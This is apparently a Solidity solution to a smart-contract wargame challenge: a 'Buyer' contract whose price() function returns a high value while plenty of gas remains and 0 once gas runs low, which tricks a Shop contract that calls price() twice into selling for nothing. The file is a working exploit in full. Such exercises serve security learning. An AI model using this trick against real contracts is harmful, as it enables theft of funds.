// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {IBuyer} from "./interfaces/IBuyer.sol";

contract Buyer is IBuyer {
    address shopAddress = 0x7945Ccb005A4645e7379B2Dcc990A22b895c1490;

    function price() external view returns (uint256) {
        if (gasleft() < 30000) {
            return 0;
        }
        return gasleft();
    }

    function buy() external {
        bytes memory callData = abi.encodeWithSignature("buy()");
        shopAddress.call(callData);
    }
}
